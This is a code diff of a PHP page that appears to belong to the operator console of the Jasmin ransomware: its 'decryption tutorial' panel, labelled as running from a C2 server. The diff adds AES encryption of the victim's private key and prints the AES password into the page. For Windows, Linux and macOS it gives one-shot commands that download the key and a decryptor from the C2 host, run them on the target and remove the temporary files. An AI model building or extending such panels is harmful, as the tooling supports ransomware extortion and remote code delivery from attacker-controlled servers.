@@ -1,6 +1,11 @@
-<?php $srv = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http').'://'.$_SERVER['HTTP_HOST']; ?>
+<?php
+$srv = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http').'://'.$_SERVER['HTTP_HOST'];
+$ks_path = __DIR__ . '/payloads/.key_secret';
+$aes_pwd = file_exists($ks_path) ? trim(file_get_contents($ks_path)) : 'KEY_NOT_SET';
+?>
 <section class="panel" id="panel-decrypt" style="display:none">
 <h2><i class="fas fa-unlock-alt"></i> 解密教程</h2>
+<div class="dt-note" style="margin-bottom:16px"><i class="fas fa-shield-alt"></i> 私钥已AES-256-CBC加密存储，解密命令自动下载加密私钥→内存解密→执行→清理</div>
 <div class="decrypt-tabs">
   <button class="dt-btn active" onclick="showDT('win')"><i class="fab fa-windows"></i> Windows</button>
   <button class="dt-btn" onclick="showDT('linux')"><i class="fab fa-linux"></i> Linux</button>
@@ -9,52 +14,70 @@
 
 <div class="dt-content" id="dt-win">
 <h3>🖥️ Windows 一键解密</h3>
-<div class="dt-step"><span>1</span>在目标机打开 PowerShell (管理员)</div>
-<div class="dt-step"><span>2</span>复制下方命令直接运行</div>
-<div class="dt-note"><i class="fas fa-shield-alt"></i> 命令会自动下载私钥、解密器、执行解密、清理临时文件</div>
-<h4 style="color:var(--accent2);margin-top:14px"><i class="fas fa-terminal"></i> 一键命令 (PowerShell)</h4>
-<pre class="dt-code"># Windows 一键解密 — 复制整段运行
-$tmp="$env:TEMP\jasmin_dec"
+<pre class="dt-code">$tmp="$env:TEMP\jasmin_dec"
 New-Item -ItemType Directory -Force -Path $tmp | Out-Null
-# 下载私钥 (请先将 private.pem 放到C2服务器 payloads/ 目录)
-Invoke-WebRequest "<?=$srv?>/payloads/jasmin_private.pem" -OutFile "$tmp\key.pem"
-# 下载解密器
+$k="<?=$aes_pwd?>"
+Invoke-WebRequest "<?=$srv?>/payloads/jasmin_private.pem.enc" -OutFile "$tmp\key.enc"
+# AES解密私钥
+$raw=[Convert]::FromBase64String((Get-Content "$tmp\key.enc" -Raw))
+$iv=$raw[0..15]; $ct=$raw[16..($raw.Length-1)]
+$aes=[System.Security.Cryptography.Aes]::Create()
+$aes.Key=[System.Text.Encoding]::UTF8.GetBytes($k)
+$aes.IV=[byte[]]$iv; $aes.Padding="PKCS7"; $aes.Mode="CBC"
+$dec=$aes.CreateDecryptor()
+$ms=New-Object IO.MemoryStream(,[byte[]]$ct)
+$cs=New-Object Security.Cryptography.CryptoStream($ms,$dec,"Read")
+$sr=New-Object IO.StreamReader($cs)
+[IO.File]::WriteAllText("$tmp\key.pem",$sr.ReadToEnd())
+$sr.Close();$cs.Close();$ms.Close()
+# 下载解密器并运行
 Invoke-WebRequest "<?=$srv?>/payloads/Jasmin_Decryptor.exe" -OutFile "$tmp\dec.exe"
-# 执行解密
-&amp; "$tmp\dec.exe" "$tmp\key.pem"
-# 清理
+& "$tmp\dec.exe" "$tmp\key.pem"
 Remove-Item -Recurse -Force $tmp</pre>
 </div>
 
 <div class="dt-content" id="dt-linux" style="display:none">
 <h3>🐧 Linux 一键解密</h3>
-<div class="dt-step"><span>1</span>在目标机打开终端</div>
-<div class="dt-step"><span>2</span>复制下方命令直接运行</div>
-<div class="dt-note"><i class="fas fa-shield-alt"></i> 自动安装依赖、下载私钥和解密脚本、执行全盘解密、清理</div>
-<h4 style="color:var(--accent2);margin-top:14px"><i class="fas fa-terminal"></i> 一键命令 (Bash)</h4>
-<pre class="dt-code"># Linux 一键解密 — 复制整段运行
+<pre class="dt-code"># Linux 一键解密 — 私钥AES加密传输
+K="<?=$aes_pwd?>"
 pip3 install -q cryptography 2>/dev/null
-curl -sL <?=$srv?>/payloads/jasmin_private.pem -o /tmp/.jk
+curl -sL <?=$srv?>/payloads/jasmin_private.pem.enc -o /tmp/.jke
 curl -sL <?=$srv?>/payloads/jasmin_decrypt.py -o /tmp/.jd
+python3 -c "
+import base64,sys
+from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
+from cryptography.hazmat.backends import default_backend
+raw=base64.b64decode(open('/tmp/.jke').read())
+iv,ct=raw[:16],raw[16:]
+c=Cipher(algorithms.AES(bytes.fromhex('$K')),modes.CBC(iv),default_backend()).decryptor()
+pt=c.update(ct)+c.finalize()
+pt=pt[:-pt[-1]]
+open('/tmp/.jk','wb').write(pt)
+"
 python3 /tmp/.jd /tmp/.jk
-rm -f /tmp/.jk /tmp/.jd</pre>
-<h4 style="color:var(--accent2);margin-top:14px"><i class="fas fa-terminal"></i> 指定目录解密</h4>
-<pre class="dt-code">python3 /tmp/.jd /tmp/.jk /home/user /var/www /opt</pre>
+rm -f /tmp/.jke /tmp/.jk /tmp/.jd</pre>
 </div>
 
 <div class="dt-content" id="dt-mac" style="display:none">
 <h3>🍎 macOS 一键解密</h3>
-<div class="dt-step"><span>1</span>打开终端</div>
-<div class="dt-step"><span>2</span>复制下方命令直接运行</div>
-<div class="dt-note"><i class="fas fa-shield-alt"></i> 与Linux相同流程，自动扫描 ~/、/Users、/tmp</div>
-<h4 style="color:var(--accent2);margin-top:14px"><i class="fas fa-terminal"></i> 一键命令</h4>
 <pre class="dt-code"># macOS 一键解密
+K="<?=$aes_pwd?>"
 pip3 install -q cryptography 2>/dev/null
-curl -sL <?=$srv?>/payloads/jasmin_private.pem -o /tmp/.jk
+curl -sL <?=$srv?>/payloads/jasmin_private.pem.enc -o /tmp/.jke
 curl -sL <?=$srv?>/payloads/jasmin_decrypt.py -o /tmp/.jd
+python3 -c "
+import base64
+from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
+from cryptography.hazmat.backends import default_backend
+raw=base64.b64decode(open('/tmp/.jke').read())
+iv,ct=raw[:16],raw[16:]
+c=Cipher(algorithms.AES(bytes.fromhex('$K')),modes.CBC(iv),default_backend()).decryptor()
+pt=c.update(ct)+c.finalize()
+open('/tmp/.jk','wb').write(pt[:-pt[-1]])
+"
 python3 /tmp/.jd /tmp/.jk
-rm -f /tmp/.jk /tmp/.jd</pre>
+rm -f /tmp/.jke /tmp/.jk /tmp/.jd</pre>
 </div>
 
-<div class="dt-note" style="margin-top:20px"><i class="fas fa-info-circle"></i> <b>使用前准备:</b> 请先将 <code>jasmin_private.pem</code> 和 <code>jasmin_decrypt.py</code> 上传到 C2 服务器的 <code>payloads/</code> 目录，确保可通过URL访问。</div>
+<div class="dt-note" style="margin-top:20px"><i class="fas fa-info-circle"></i> <b>准备:</b> 点击「生成RSA密钥对」后，加密私钥(<code>.pem.enc</code>)和解密脚本会自动部署到 payloads/ 目录</div>
 </section>
